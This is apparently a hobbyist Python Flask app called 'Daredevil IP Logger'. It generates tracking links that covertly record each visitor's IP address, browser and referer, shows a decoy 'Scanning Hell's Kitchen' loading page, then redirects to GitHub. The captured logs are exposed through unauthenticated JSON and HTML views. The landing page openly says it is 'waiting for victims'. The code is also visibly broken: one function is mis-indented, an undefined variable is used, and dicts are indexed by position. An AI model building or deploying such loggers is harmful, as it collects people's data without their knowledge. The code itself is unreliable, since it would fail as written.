from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)
logs = []
LOG_FILE = 'logs.json'

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head><title>🦇 Daredevil IP Logger</title>
<style>
body {background:#1a0000;color:#ff0000;font-family:Arial;text-align:center;padding:50px;}
h1 {font-size:48px;text-shadow:2px 2px 4px #000;}
.tracking {background:#330000;padding:20px;margin:20px;border:2px solid #ff0000;border-radius:10px;}
a {color:#ff0000;text-decoration:none;font-size:18px;}
.logs {background:#000;padding:20px;margin:20px;border-radius:5px;}
</style>
</head>
<body>
<h1>🦇 DAREDEVIL IP LOGGER 🦇</h1>
<p style="color:#b30000;font-size:20px;">Sense the unseen... Track every visitor</p>
<div class="tracking">
<h3>Your Tracking Link:</h3>
<a href="/log/TEST123" target="_blank">https://yourapp.onrender.com/log/TEST123</a><br><br>
<strong>Replace TEST123 with any 7-char code!</strong>
</div>
<div class="logs">
<h3>View Captured Logs:</h3>
<a href="/logs" target="_blank">📊 View JSON Logs</a> | 
<a href="/logs/html" target="_blank">📋 Pretty Logs</a>
</div>
<p>Server active - waiting for victims...</p>
</body>
</html>
    '''

@app.route('/log/<log_id>')
def track(log_id):
real_ip = request.headers.get('X-Forwarded-For', 
                request.headers.get('X-Real-IP', request.remote_addr))
if real_ip:
    real_ip = real_ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    visitor = {
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': ip,
        'user_agent': user_agent[:100],
        'referer': referer[:100],
        'log_id': log_id,
        'country': 'Unknown'  # Add GeoIP later if needed
    }
    logs.append(visitor)
    save_logs()
    
    return '''
<!DOCTYPE html>
<html>
<head><title>Loading...</title>
<style>
body {background:linear-gradient(45deg,#1a0000,#330000);color:#ff0000;font-family:Arial;text-align:center;margin:0;padding:50px;min-height:100vh;}
.daredevil {font-size:48px;font-weight:bold;text-shadow:2px 2px 4px #000;margin-bottom:20px;}
.loading {font-size:24px;color:#b30000;animation:pulse 2s infinite;}
@keyframes pulse {0%{opacity:1;}50%{opacity:0.5;}100%{opacity:1;}}
.radar {width:200px;height:200px;border:3px solid #ff0000;border-radius:50%;margin:50px auto;position:relative;animation:rotate 4s linear infinite;}
.radar::before {content:'';position:absolute;width:2px;height:100%;background:#ff0000;top:0;left:50%;transform-origin:bottom;}
@keyframes rotate {from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
</style>
</head>
<body>
<div class="daredevil">🦇 DAREDEVIL 🦇</div>
<div class="loading">Scanning Hell's Kitchen...</div>
<div class="radar"></div>
<p style="color:#b30000;">Target acquired. Standing by...</p>
<script>
setTimeout(() => { window.location.href = 'https://github.com'; }, 3000);
</script>
</body>
</html>
    '''

@app.route('/logs')
def get_logs_json():
    return jsonify(logs[-100:])  # Last 100 logs

@app.route('/logs/html')
def get_logs_html():
    html = '''
<!DOCTYPE html>
<html><head><title>Daredevil Logs</title>
<style>
body {background:#1a0000;color:#ff0000;font-family:monospace;padding:20px;}
table {width:100%;border-collapse:collapse;}
th,td {border:1px solid #ff0000;padding:8px;text-align:left;}
th {background:#330000;}
tr:nth-child(even) {background:#000;}
.ip:hover {background:#660000;cursor:pointer;}
.stats {background:#330000;padding:15px;margin-bottom:20px;border-radius:5px;}
</style>
</head><body>
    '''
    
    total = len(logs)
    unique_ips = len(set(log[1] for log in logs))
    
    html += f'''
    <div class="stats">
    <h2>📊 Daredevil Intel Report</h2>
    <p><strong>Total Visitors:</strong> {total} | <strong>Unique IPs:</strong> {unique_ips}</p>
    <p><strong>Last Update:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    <table>
    <tr><th>Time</th><th>IP</th><th>User-Agent</th><th>Log ID</th><th>Referer</th></tr>
    '''
    
    for log in reversed(logs[-50:]):  # Last 50
        html += f'''
        <tr>
        <td>{log["time"]}</td>
        <td class="ip">{log["ip"]}</td>
        <td>{log["user_agent"][:40]}...</td>
        <td>{log["log_id"]}</td>
        <td>{log["referer"][:40]}...</td>
        </tr>
        '''
    
    html += '</table></body></html>'
    return html

def save_logs():
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
    except:
        pass

def load_logs():
    global logs
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                logs = json.load(f)
    except:
        logs = []

if __name__ == '__main__':
    load_logs()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
